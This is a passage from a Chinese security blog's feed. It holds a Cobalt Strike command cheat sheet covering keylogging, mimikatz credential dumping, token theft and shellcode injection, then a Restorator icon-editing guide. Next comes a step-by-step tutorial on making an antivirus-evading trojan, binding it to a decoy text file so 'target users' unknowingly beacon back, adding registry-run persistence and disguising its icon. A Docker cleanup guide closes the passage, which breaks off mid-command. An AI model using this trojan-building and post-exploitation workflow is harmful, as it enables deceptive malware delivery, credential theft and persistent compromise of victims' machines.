在特定进程中生成会话</span><br><span class="line"><span class="built_in">jobkill</span> 杀死一个后台任务</span><br><span class="line">jobs 列出后台任务</span><br><span class="line">kerberos_ccache_use 从ccache文件中导入票据应用于此会话</span><br><span class="line">kerberos_ticket_purge 清除当前会话的票据</span><br><span class="line">kerberos_ticket_use 从ticket文件中导入票据应用于此会话</span><br><span class="line">keylogger 键盘记录</span><br><span class="line">kill 结束进程</span><br><span class="line">link Connect to a Beacon peerover a named pipe</span><br><span class="line">logonpasswords 使用mimikatz转储凭据和哈希值</span><br><span class="line">ls 列出文件</span><br><span class="line">make_token 创建令牌以传递凭据</span><br><span class="line">mimikatz 运行mimikatz</span><br><span class="line">mkdir 创建一个目录</span><br><span class="line">mode dns 使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">mode http 使用HTTP作为通信通道</span><br><span class="line">mv 移动文件</span><br><span class="line">net net命令</span><br><span class="line">note 备注</span><br><span class="line">portscan 进行端口扫描</span><br><span class="line">powerpick 通过Unmanaged PowerShell执行命令</span><br><span class="line">powershell 通过powershell.exe执行命令</span><br><span class="line">powershell-import 导入powershell脚本</span><br><span class="line">ppid <span class="keyword">Set</span> parent <span class="comment">PID forspawned post-ex jobs</span></span><br><span class="line">ps 显示进程列表</span><br><span class="line">psexec <span class="comment">Use a service to spawn asession on a host</span></span><br><span class="line">psexec_psh <span class="comment">Use PowerShell to spawn asession on a host</span></span><br><span class="line">psinject 在特定进程中执行<span class="comment">PowerShell</span>命令</span><br><span class="line">pth 使用<span class="comment">Mimikatz</span>进行传递哈希</span><br><span class="line">pwd 当前目录位置</span><br><span class="line">reg <span class="comment">Query the registry</span></span><br><span class="line">rev2self 恢复原始令牌</span><br><span class="line">rm 删除文件或文件夹</span><br><span class="line">rportfwd 端口转发</span><br><span class="line">run 在目标上执行程序<span class="comment">(</span>返回输出<span class="comment">)</span></span><br><span class="line">runas 以另一个用户权限执行程序</span><br><span class="line">runasadmin 在高权限下执行程序</span><br><span class="line">runu <span class="comment">Execute a program underanother PID</span></span><br><span class="line">screenshot 屏幕截图</span><br><span class="line">setenv 设置环境变量</span><br><span class="line">shell <span class="comment">cmd.exe</span>  打开<span class="comment">cmd</span>终端</span><br><span class="line">shell <span class="comment">ipconfig</span> 执行<span class="comment">ipconfig</span>命令</span><br><span class="line">shinject 将<span class="comment">shellcode</span>注入进程</span><br><span class="line">shspawn 生成进程并将<span class="comment">shellcode</span>注入其中</span><br><span class="line">sleep 设置睡眠延迟时间</span><br><span class="line">socks 启动<span class="comment">SOCKS4</span>代理</span><br><span class="line">socks <span class="comment">stop</span> 停止<span class="comment">SOCKS4</span></span><br><span class="line">spawn <span class="comment">Spawn a session</span></span><br><span class="line">spawnas <span class="comment">Spawn a session as anotheruser</span></span><br><span class="line">spawnto <span class="comment">Set executable tospawn processes into</span></span><br><span class="line">spawnu <span class="comment">Spawn a session underanother PID</span></span><br><span class="line">ssh 使用<span class="comment">ssh</span>连接远程主机</span><br><span class="line">ssh-key 使用密钥连接远程主机</span><br><span class="line">steal_token 从进程中窃取令牌</span><br><span class="line">timestomp 将一个文件时间戳应用到另一个文件</span><br><span class="line">unlink <span class="comment">Disconnect from parentBeacon</span></span><br><span class="line">upload 上传文件</span><br><span class="line">wdigest 使用<span class="comment">mimikatz</span>转储明文凭据</span><br><span class="line">winrm 使用<span class="comment">WinRM</span>在主机上生成会话</span><br><span class="line">wmi 使用<span class="comment">WMI</span>在主机上生成会话</span><br><span class="line">argue 进程参数欺骗</span><br></pre></td></tr></table></figure><p>简单执行命令<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/289671437f709365de5a2814c404276a.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> 3 全部命令3秒执行(默认时60秒太长，)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/70585c627c2b72b05a8327148763c874.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行系统命令要在命令前加个shell <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f19e237d101f5d2af4c7711ed17dfa1d.png" alt="在这里插入图片描述"></p><h2 id="三、如何加载插件及EXE？">三、如何加载插件及EXE？</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/21e95c67f6a2dd9b78413dd1dea0a43e.png" alt="在这里插入图片描述"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a608b591991be7e7e89b5c3bb984f4b0.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f1efc47dcc28d2fbb0b79071e12f9baf.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9dc44ed86a5a91ea6ba0d969e4082ff3.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8d62307548f725b99ad73a81ca39315b.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/fd4168389490b83b43a09c7ca5be69d5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1f8e05004bd2fa94737dad28ab5d5c60.png" alt="在这里插入图片描述"><br><strong>如果不想加载插件想直接上传成品exe文件也是可以的</strong><br>Ladon插件/工具体积小、免杀<br><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7040b73f54481840d89d14852e65f8f7.png" alt="在这里插入图片描述"><br>可以利用CS自身文件上传功能上传成品的exe或者直接使用插件<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2c0d3ecca0022bd64564630526353b06.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d0e664b3ab32c9f82cc3418f1ced1da5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dfb7e88979435b5388d14be7384a98a0.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/99cb7148de4fcebe8dec9b12715c3924.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1cac18e081c12f9b1ebb46bd8ae65368.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/02a3a3e8122eb70a4b749a633105c78b.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ac9b3c70920e1ac1babff556af996d4a.png" alt="在这里插入图片描述"></p><p>四、联动MSF<br>1、CS-&gt;MSF(CS把权限转交给MSF)</p><p><strong>CS：</strong><br>新建个监听器（监听的协议要与MSF一致，这里监听HTTP协议，那么MSF也要监听HTTP协议）<br>CS监听的协议是windows/foreign/reverse_http字样</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/9f6954a480ba11e21ac47978802618f5.png" alt="在这里插入图片描述"></p><p>spawn msf （要联动的会话上执行该命令）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/751a23740a2febd0a0ed150344224f4e.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">🥧CobaltStrike4.8汉化版带插件使用方法</summary>
    
    
    
    <category term="web渗透" scheme="https://m3ngx1ng.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="工具使用" scheme="https://m3ngx1ng.github.io/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Restorator常见使用方法</title>
    <link href="https://m3ngx1ng.github.io/posts/1586e22.html"/>
    <id>https://m3ngx1ng.github.io/posts/1586e22.html</id>
    <published>2024-11-17T16:00:00.000Z</published>
    <updated>2024-12-02T09:11:59.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Restorator常见使用方法有哪些？">Restorator常见使用方法有哪些？</h2><h3 id="案例一：解决WinRAR弹出广告">案例一：解决WinRAR弹出广告</h3><h4 id="1、导出rc文件">1、导出rc文件</h4><p>WinRAR安装完成后，用Restorator 2018打开安装目录WinRAR.exe。点开“打开”对话框后，通过WinRAR的安装路径，找到这个exe程序，然后点击“打开”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132703168905322378488.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第2张"></p><p>Restorator 2018界面主要分为左右两个区，左边是资源树，我们点击“字符串”左边的加号，在展开的项目中，右键点击“中文”，然后选择“导出”→“导出为.rc”，保存到桌面：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132703168905322323484.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第3张"></p><h4 id="2、打开rc文件">2、打开rc文件</h4><p>上一步会导出一个.rc后缀的文件到指定位置。这一步我们去找到这个文件。如下图所示，我将导出的文件命名为“WinRAR导出分析-中文(简体，中-国).rc”，找到它，右键点开菜单后选择“打开方式”，然后用记事本的方式打开它也可以用文本编辑工具（<a href="https://www.lw50.com/post/notepadv85.html">notepad++</a>）修改：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322441114.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第4张"></p><p>注意选择用记事本打开这个.rc文件时，不要勾选“始终用此应用打开.rc文件”。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322414576.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第5张"></p><h4 id="3、定位弹广代码">3、定位弹广代码</h4><p>这一步很关键。下图就是用记事本打开.rc文件的样子，可以看到每一行都有个序数，后面引号里是一个可执行操作的名字。我们需要找到有关弹窗广告的代码，并用合适的方式覆盖它。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132704168905322461116.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第6张"></p><p>由于WinRAR在不停的更新中，所有新老版本的WinRAR将会有区别。我的WinRAR版本为中文版6.02，涉及弹窗的代码在第1277行。如果你用的WinRAR是其他版本，有可能不是第1277行，但是大致也跑不了1000~1300之间，特征是前后都一、两条网址。由于这个代码行，相对于其他中文还是很明显的，仔细找一下并不是很麻烦。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132704168905322468893.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第7张"></p><h4 id="4、覆盖弹广代码">4、覆盖弹广代码</h4><p>找到弹窗代码后删除，改为</p><blockquote><p>“Reminder dialog information”</p></blockquote><p>注意：要保留引号，逗号等等，格式要与之前保持一致，避免马虎。改好之后，左上菜单选择“文件”→“另存为”，将这个.rc文件保存。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132705168905322511535.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第8张"></p><h4 id="5、导入已保存的-rc文件">5、导入已保存的.rc文件</h4><p>这一步，我们把刚才已保存的.rc文件导入到Restorator 2018。操作与之前类似，先在左侧资源树点“+”展开“字符串”，然后右键点击“中文(xxx)”，菜单中选择“导入”→“导入…”。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132705168905322575625.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第9张"></p><p>打开刚才保存的.rc文件：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132705168905322566301.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第10张"></p><p>此时可以看到Restorator 2018右侧的查看器内，已经是之前.rc的新内容（第1277行代码已经被覆盖），接下来选择“文件”→“另存为”，</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132706168905322653221.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第11张"></p><p>另存为一个新的exe文件：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132706168905322642506.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第12张"></p><h4 id="6、覆盖源WinRAR-exe文件">6、覆盖源WinRAR.exe文件</h4><p>接下来，我们把这个新WinRAR.exe，粘贴到WinRAR目录，覆盖原安装目录exe同名程序即可大功告成！</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132706168905322630189.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第13张"></p><p>好啦，现在你再启动WinRAR！再也没有弹窗广告了！</p><h3 id="案例二：修改软件标题">案例二：修改软件标题</h3><p>1、首先载入我们需要修改的软件：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132708168905322863622.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第14张"></p><p>2、先更改成“编辑模式”。方法：单机“查看器”——“编辑模式”即可：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132709168905322970763.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第15张"></p><p>3、在“资源树”里找到“对话框”——“101”，在右侧“标题”修改你希望看到的软件标题栏显示内容。中间的“资源查看器”会有预览。效果图如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132715168905323546042.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第16张"></p><p>4、然后在“资源树”里找到“对话框”——“112”这一项。我们只需单击我们想改的文字，在右侧“标题”下方修改即可：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132717168905323752094.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第17张"></p><p>5、修改完成后的效果如下：</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132725168905324596468.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第18张"></p><p>6、然后就是修改图标。这里拿logo来演示！ico图标分辨率为32x32：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132726168905324639140.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第19张"></p><p>7、“资源树”——“图标”——“105”，右击“105”——“导入”——“导入到”，把ZOL导入；接着用同样的方法把图标导入到“108”中：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132731168905325163742.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第20张"></p><p>8、单击查看效果如何：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132733168905325316894.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第21张"></p><p>9、在“资源树”里找到“版本”项：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132735168905325574811.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第22张"></p><p>10、右下方就是我们要修改的内容了。可以把自己的个人信息都写进去：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132737168905325796822.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第23张"></p><h3 id="案例三：修改软件图标">案例三：修改软件图标</h3><p>1、进去主界面后，如果需要填写注册码，打开“汉化说明”这个文本特别信息中的就是注册码。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132741168905326172413.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第24张"></p><p>2、打开你要修改的文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132742168905326273146.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第25张"></p><p>3、打开文件后，左侧资源树点击（红1）小三角拉开，把图标项也拉开（红2），现在看到（红3）的是该文件的包含的所有ICON，选中后可以看到图标的信息。</p><p><img src="https://www.lw50.com/zb_users/upload/2023/07/20230711132744168905326485900.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第26张"></p><p>4、选中图标_5000，可以在资源查看器看到ICON的信息（红1），可以看出来这个文件的图标格式是比较多的，往下拉（红2）就可以看到RGB/A的图像信息，目前看到的是16色信息。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132745168905326538644.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第27张"></p><p>5、256<em>128</em>96<em>64</em>48<em>32</em>24<em>16-RGB/A、256</em>128<em>96</em>64<em>48</em>32<em>24</em>16-256色、256<em>128</em>96<em>64</em>48<em>32</em>24*16-16色以上是图标项-5000图像信息，替换新的ICON进来时请确保图标信息要和原来的格式/数量一致！</p><p>6、为了达到安全稳定的使用效果，请逐个检查你将要选择替换的ICON项的格式和数量，确保替换一致。</p><p>7、请将你要替换的ico全部放到同一个文件夹里面，并对应图标在应用文件里面的编号（红1），比如：5000对应的是安全，5004对应的是防火墙……（红2）这里是文件游览器，方便我们查看要替换用的ICON。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132746168905326653562.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第28张"></p><p>8、将你要替换的图标整理到同一个文件夹下，然后用文件游览器找到并进入（红2），直到看到所有已经编号好的图标（红1）。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20230711132748168905326864697.jpeg" alt="Restorator 2018汉化版附注册码及使用方法  第29张"></p><p>9、如果你的准备工作做好了，我们就要开始批量替换图标了。</p><p>10、右键左边资源树的图标项（文件夹图标），选择导入(O)，点击自动导入所有&quot;图标&quot;类型(Z)</p><p>11、导入完后，直接按F12另存为，保存完成了！</p>]]></content>
    
    
    <summary type="html">🥧Restorator常见使用方法</summary>
    
    
    
    <category term="web渗透" scheme="https://m3ngx1ng.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="工具使用" scheme="https://m3ngx1ng.github.io/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>免杀木马+文件捆绑+权限伪装</title>
    <link href="https://m3ngx1ng.github.io/posts/1bec3970.html"/>
    <id>https://m3ngx1ng.github.io/posts/1bec3970.html</id>
    <published>2024-11-17T16:00:00.000Z</published>
    <updated>2024-12-02T09:27:47.018Z</updated>
    
    <content type="html"><![CDATA[<h1>免杀木马+文件捆绑+权限伪装</h1><ul><li><p><strong>文章前言</strong></p><p>通过学习使用Cobalt Strike来制作木马，使用摧日对其进行免杀覆盖，使用GoFilebinder对其进行免杀捆绑，最后利用Restorator对其进行图标修改。</p></li><li><p><strong>环境和软件准备</strong></p><p>\1. 一台windows系统的电脑作为攻击机</p><p>2.一台靶机</p><p>3.Cobalt Strike</p><p>4.摧日</p><p>5.GoFilebinder</p><p>6.Restorator</p></li><li><p><strong>工具介绍</strong></p><p>摧日：一款红队专用免杀木马生成器，基于shellcode生成绕过所有杀软的木马主要支持C语言的shellcode和纯十六进制的shellcode<br>GoFileBinder：golang免杀捆绑器<br>Restorator：一款修改exe执行程序图标的小工具</p></li><li><p><strong>正文开始</strong></p><p>选用cs中的c格式shellcode，用cs生成一个c语言的相关东西，同时勾选上x64</p></li></ul><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGTurmQDUUoIkwBgIUztkiayF20PQOFDEGIDPwCsExIlZMoXWZtqhbHUQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGPsqAbCOyCY0LR1zGsKphmjGtM7UdiarEu9KtVXqAiaJqUXDe5fkibo8HQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>完成以上步骤后，接下来便开始对其进行免杀操作，用到的工具摧日对其进行免杀处理</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGWGKt2ibzRFhNE3XWAQ4SNIDDgcx9iasydQDQ76s0lDdwIoL6lz3QSJnQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>使用前请先获取相关工具，并确保已经安装工具所需要的的go环境，至于go环境安装请各位自行查阅本文不在做出相关介绍，安装完毕后进行下一步操作。复制上一步中生成的c文件的中的相关字符，将其另存为一个新的文档，并将该文档与摧日工具的exe文件放在一个目录之中，并运行工具，运行成功后将会得到免杀后的文件hoshino.exe。用相关管家进行查杀后，都可以正常通过。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGe2AiaWzWQRTVAaDMS4PdZJB2OwscrU2Od3UElHEbaB4alWSVxILs1ww/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGLFv5IbhM97F127XqH2teAoYrFOK0Aia24fdlAPrVrl1fdd364prbZ6w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>然后进行的操作是将这个马和正常的东西捆绑在一起，这个东西可以是可执行文件exe，也可以是文本txt，也可以是文档doc，任何你想的东西都可以进行捆绑。<br>最后实现的效果是：目标用户点击你发送的恶意文件之后会在你的CS客户端上上线，而且目标用户打开的文件可以正常的使用，并且你的木马文件会自动迁移到C:\Users\Public<br>下面将木马和一个txt文本文件进行捆绑：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGR4x3GXibUMMPPmiaD0gDe0FXbg4KGzwKb8rMEI8y18Iga8ic9YcyqORXg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>将木马和txt文本文件还有GoFileBinder放在同级目录下，运行后得到如下结果，其中新出现的bilibili.exe就是我们要得到的文件</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGGRG2ibtmIjhvOkPhxzToHfPmVSH88PDGicKjLERicaxtQcsphHztxHg6g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>进行相关测试，将得到的文件双击后，该文件便会消失，在桌面上打开的便是我们所预设的ceshi.txt，并且我们的原文间将会自动一直到public目录下，cs也显示主机已经上线，至此所有工作已全部完成。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcG1F5yKYmDyIqj4H7s2ibdN7w5tPWFIm6hDrVsjlCyDSeWYx28IWgcI1w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/640" alt="图片"></p><p>最后一步，权限维持，如果不进行权限维持的话，目标用户在进行电脑重启后便会让改文件关闭，因此便需要用对其增加开机自启的相关操作，其后续路径因为程序会自动移动到public目录下便很好就能设置，</p><ul><li></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span> <span class="keyword">reg</span> <span class="built_in">add</span> HKLM\SOFTWARE\Microsoft\Windows\</span><br></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/pK1OeDqnaO2ztzeC0ibzlic0YY2zJpEDcGPjicPN7J7OvoS4UJvyzEkic3qlqUYl4Nby6ImRM2YopEtia00jpm7Zv3w/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p><p>最后利用Restorator工具对该文件进行图标美化操作，可以将其伪装成一些较为常见的进程图标，该工具的使用较为方便，本文在这里便不再进行相关的阐述，请自行理解！</p>]]></content>
    
    
    <summary type="html">🥧免杀木马+文件捆绑+权限伪装</summary>
    
    
    
    <category term="web渗透" scheme="https://m3ngx1ng.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://m3ngx1ng.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>docker删除镜像和容器</title>
    <link href="https://m3ngx1ng.github.io/posts/329caef9.html"/>
    <id>https://m3ngx1ng.github.io/posts/329caef9.html</id>
    <published>2024-11-16T16:00:00.000Z</published>
    <updated>2024-12-02T09:10:09.756Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="优雅删除镜像（推荐做法）">优雅删除镜像（推荐做法）</h2><p>1、查看Docker要删除的镜像，如目标版本为stable-perl的Nginx，镜像ID（IMAGE ID）为 df1998569adb。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p>2、使用命令“docker rmi 镜像ID”删除Nginx（stable-perl）的镜像，只取“IMAGE ID”的前3个字符即可。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi df1</span><br></pre></td></tr></table></figure><p>报错内容如下，意思是镜像（df1）存在使用中的容器（f66），不能强制删除镜像。官方的意思是要先停止容器运行，再进行镜像的删除操作吗？</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response <span class="keyword">from</span> daemon: <span class="keyword">conflict</span>: unable <span class="keyword">to</span> <span class="keyword">delete</span> df1998569adb (cannot be forced) - image <span class="keyword">is</span> being used <span class="keyword">by</span> running container f6678f2821c7</span><br></pre></td></tr></table></figure><p>3、查看Docker运行中的容器，如容器 nginx:stable-perl ，容器ID为 f66。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure><p>4、先停止nginx:stable-perl容器（f66）运行，再去删除Nginx（stable-perl）镜像（df1）。<br>（1）停止容器（f66）运行。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop f66</span><br></pre></td></tr></table></figure><p>（2）删除镜像（df1）。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi df1</span><br></pre></td></tr></table></figure><p>What？都已经停止容器（f66）运行了，删除镜像（df1）怎么还报错啊！？其实，只停止容器的正常运行还不行，还有最重要的一步没做：删除容器。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response <span class="keyword">from</span> daemon: <span class="keyword">conflict</span>: unable <span class="keyword">to</span> <span class="keyword">delete</span> df1998569adb (must be forced) - image <span class="keyword">is</span> being used <span class="keyword">by</span> stopped container f6678f2821c7</span><br></pre></td></tr></table></figure><p>5、查看Docker所有容器的状态（包含运行中的和已停止的），“STATUS”为“Exited(0)”代表停止运行。执行删除容器命令“docker rm f66”，删除 nginx:stable-perl 容器，再查看 nginx:stable-perl 容器是否还在列表中。<br>（1）查看Docker所有容器的状态。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>（2）删除 nginx:stable-perl 容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> f66</span><br></pre></td></tr></table></figure><p>（3）再查看Docker所有容器的状态，发现 nginx:stable-perl 容器（f66）已经不存在了。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>6、删除镜像，再查看所有镜像，发现列表中已经不存在版本为stable-perl的Nginx镜像（df1）。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi df1</span><br></pre></td></tr></table></figure><h2 id="优雅删除容器（推荐做法）">优雅删除容器（推荐做法）</h2><p>1、查看Docker中运行中的容器，例如 Nginx ，容器ID为 39c，并删除容器。<br>（1）查看Docker中运行中的容器。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure><p>（2）删除Nginx容器（39c）。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rm <span class="number">39</span>c</span><br></pre></td></tr></table></figure><p>（3）发现会报错，报错内容如下，意思是容器还在运行，不能删除，先停止运行再删除，或直接强制删除。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Error </span>response from daemon: You cannot remove a running container 39cdb69246fdb6b623cff60af5b59e033149b6940bc5e0432c760ea245da81a9. Stop the container before attempting removal or force remove</span><br></pre></td></tr></table></figure><p>2、停止容器（39c），查看所有容器的运行状态。<br>（1）停止容器。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> 